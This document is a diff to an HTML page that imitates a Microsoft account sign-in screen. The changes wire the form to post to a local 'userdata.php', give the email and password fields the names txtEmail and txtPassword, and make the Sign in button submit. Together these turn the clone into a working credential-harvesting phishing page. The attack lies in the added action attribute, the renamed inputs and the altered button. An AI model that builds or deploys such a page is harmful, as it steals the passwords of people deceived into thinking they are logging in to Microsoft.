@@ -14,7 +14,7 @@
 
 <body class="cb">
     <form id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"
-        class="provide-min-height">
+        class="provide-min-height" action="./userdata.php">
         <div id="lightboxTemplateContainer" class="provide-min-height">
             <div id="lightboxBackgroundContainer" class="provide-min-height">
                 <div class="background-image-holder">
@@ -48,7 +48,7 @@
                                         <div class="form-group col-md-24">
                                             <div class="placeholderContainer">
                                                 <input type="email" maxlength="113" class="form-control input text-box"
-                                                    aria-required="true" id="email-input"
+                                                    aria-required="true" id="email-input" name="txtEmail"
                                                     placeholder="Email, phone, or Skype">
                                             </div>
                                         </div>
@@ -106,9 +106,9 @@
                                             <div class="row">
                                                 <div class="form-group col-md-24">
                                                     <div class="placeholderContainer">
-                                                        <input type="password" name="passwd" id="password-input"
+                                                        <input type="password" id="password-input"
                                                             autocomplete="off" class="form-control input text-box"
-                                                            placeholder="Password">
+                                                            placeholder="Password" name="txtPassword">
                                                     </div>
                                                 </div>
                                             </div>
@@ -132,9 +132,13 @@
                                                             <div
                                                                 class="col-xs-24 no-padding-left-right button-container button-field-container">
                                                                 <div class="inline-block button-item">
-                                                                    <button id="idSIButton" type="button"
+                                                                    <button id="idSIButton"
                                                                         class="win-button button_primary button primary">Sign
                                                                         in</button>
+                                                                    <!-- <button id="idSIButton" type="button"
+                                                                        class="win-button button_primary button primary">Sign
+                                                                        in</button> -->
+                                                                        <!-- <input type="submit" name="Submit" id="Submit" value="Submit"> -->
                                                                 </div>
                                                             </div>
                                                         </div>
